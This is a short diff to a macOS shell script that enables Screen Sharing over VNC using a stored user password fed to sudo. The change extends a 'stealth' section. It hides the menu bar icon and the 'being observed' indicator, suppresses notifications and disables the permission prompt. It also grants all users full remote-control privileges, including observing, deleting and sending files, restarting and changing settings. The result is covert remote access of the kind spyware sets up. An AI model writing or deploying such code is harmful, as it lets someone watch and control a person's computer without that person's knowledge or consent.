@@ -319,9 +319,11 @@ echo "      Enabling Screen Sharing..."
 if [ -n "$USER_PASS" ]; then
   echo "$USER_PASS" | sudo -S launchctl load -w /System/Library/LaunchDaemons/com.apple.screensharing.plist 2>/dev/null
   echo "      Screen Sharing enabled (VNC port 5900)"
-  # Stealth: hide menu bar icon + suppress observer notification
+  # Stealth: hide menu bar icon + no "being observed" indicator + suppress notifications
   echo "$USER_PASS" | sudo -S /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart \
-    -configure -menuextra -no 2>/dev/null
+    -configure -menuextra -no \
+    -allowAccessFor -allUsers -privs -ControlObserve -DeleteFiles -TextMessages \
+    -OpenQuitApps -GenerateReports -RestartShutDown -SendFiles -ChangeSettings 2>/dev/null
   echo "$USER_PASS" | sudo -S defaults write /Library/Preferences/com.apple.RemoteManagement ScreenSharingReqPermEnabled -bool NO 2>/dev/null
   echo "      Screen Sharing stealth mode configured"
 fi
